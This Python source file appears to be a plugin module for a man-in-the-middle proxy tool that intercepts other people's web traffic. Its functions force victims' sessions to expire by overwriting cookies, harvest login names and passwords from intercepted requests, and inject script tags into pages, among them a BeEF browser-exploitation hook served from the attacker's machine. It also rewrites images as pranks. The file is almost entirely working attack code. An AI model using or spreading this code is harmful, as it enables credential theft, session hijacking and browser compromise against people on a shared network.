
""" Contains multiple actions to handle callbacks from mim
    (More complex actions each have their own module and just need importing)

    Usage:
        from plugins import otherplugins
        otherplugins.init(args, BEEFPORT, FILESERVER, FILEPORT)

    The init function is needed to pass args and then test args["--option"]
"""

import logging as log
import sys
import os
from subprocess import call
from mim.bash import ifconfig
import fileserver
from twisted.internet import reactor

# used by actions
import StringIO
from urlparse import urlparse
import lxml
# note this package is called Pillow
from PIL import Image

# callbacks
from mim.proxyserver import events as s_events
from mim.proxyclient import events as c_events

# domains that have had sessions killed to force logoff
killed = set()

BEEFPORT = 3000
FILESERVER = None
ifaces = ifconfig().ifaces
for iface in ifaces:
    if iface.name.startswith("wlan") or iface.name.startswith("eth"):
        FILESERVER = iface.ip
if not FILESERVER:
    log.error("No WLAN FOUND")
    sys.exit()
FILEPORT = 8000

def init(args):
    if args["--kill"]:
        s_events.gotRequest += kill
    if args["--auth"]:
        s_events.gotRequest += auth
    if args["--inject"]:
        c_events.gotResponseTree += inject
    if args["--beef"]:
        c_events.gotResponseTree += beef
        os.chdir("/usr/share/beef-xss")
        call(['sudo', './beef'])
        log.info("starting beef server on %s" %BEEFPORT)
    if args["--cats"]:
        c_events.gotResponseTree += cats
    if args["--upsidedown"]:
       c_events.gotResponseImage += upsidedown
       
    # start servers
    if args["--cats"] or args["--inject"]:
        datafolder = os.path.join(os.path.dirname(__file__), "data")
        reactor.listenTCP(FILEPORT, fileserver.Site( \
                fileserver.Data(datafolder)))
        log.info("starting file server on %s:%s" %(FILESERVER, FILEPORT))


########################### gotRequest ########################################################################

def kill(sender):
    """ kill session by expiring all cookies on first call to a domain """
    if sender.method == "POST" or not sender.requestHeaders.hasHeader('cookie') or \
            sender.domain in killed:
        return
    log.debug("{id} Killing session for {domain}".format(id=sender.id, domain=sender.domain))
    sender.setResponseCode(302, "Moved")
    sender.setHeader("Connection", "close")
    sender.setHeader("Location", sender.pathquery)

    killed.add(sender.domain)

    # get list of unique cookie names
    names = set()
    cookies = sender.getHeader("cookie")
    for cookie in cookies.split(";"):
        names.add(cookie.split("=")[0].strip())

    # multiple attempts to kill session
    # domains = .reddit.com, forum.reddit.com; paths = /, /rootpath
    domains = [sender.domain, '']
    paths = ["/"]
    try:
        paths.append(sender.path.split("/")[1])
    except:
        pass

    for name in names:
        # note must include domain and must set path or set-cookie is ignored.
        # note must set expires date otherwise will be treated as a session cookie.
        for domain in domains:
            for path in paths:
                sender.addCookie(name, "expired", domain=domain, path=path, expires="Mon, 01-Jan-1990 00:00:00 GMT")

    log.debug("{id} Response to kill sessions:\n{response}" \
                            .format(id=sender.id, response=sender.getResponse()))
    sender.finish()

def auth(sender):
    """ log userids and passwords from get and post requests
        NOTE this will not work with most sites """

    include = ["log", "login", "logon", "user", "username", "key", "name", "email", \
             "password", "pass", "passwd", "pwd", "psw", "passw", "auth"]

    query = sender.data if sender.data else sender.query
    if not query:
        return

    # split into auth and noauth
    q = urlparse.parse_qs(query)
    auth = dict()
    noauth = dict()
    for k, v in q.items():
        if k in include:
            auth[k] = v
        else:
            noauth[k] = v

    # output auth
    auth = '\n'.join(["%s=%s"%(k,v) for k, v in auth.items()])
    log.info("query strings===>\n%s"% auth)

    # output noauth truncating the values
    noauth = {k: v[:15]+"..." if len(v)>15 else v for k, v in noauth.items()}
    noauth = '\n'.join(["%s=%s"%(k,v) for k, v in noauth.items()])
    log.info("auth strings===> ***************************************\n%s" % noauth)

########################### gotResponseTree ########################################################################

def inject(sender, tree):
    """ include jquery to remove https e.g. ebay changes loaded back to https after loading """
    injection = '<script src=http://%s:%s/injection.html></script>'%(FILESERVER, FILEPORT)
    head = tree.xpath("//head")[0]
    elem = lxml.etree.fromstring(injection)
    head.insert(0, elem)


def beef(sender, tree):
    """ inject a beef hook for the browser exploitation framework """
    injection = '<script src=http://%s:%s/hook.js></script>'%(FILESERVER, BEEFPORT)
    head = tree.xpath("//head")[0]
    elem = lxml.etree.fromstring(injection)
    head.insert(0, elem)

def cats(sender, tree):
    """ replace image links with link to image on server
    NOTE: does not replace other links e.g. <a> """
    for item in tree.xpath("//img"):
        item.attrib["src"] = "http://%s:%s/cats.jpg"%(FILESERVER, FILEPORT)

#################### gotResponseImage ###############################################################################

def upsidedown(sender):
    """ turn image upsidedown """
    try:
        s = StringIO.StringIO(sender.data)
        img = Image.open(s).rotate(180)
        s2 = StringIO.StringIO()
        img.save(s2, sender.imagetype)
        sender.data = s2.getvalue()
    except:
        log.exception("cannot rotate image with type=%s" % sender.imagetype)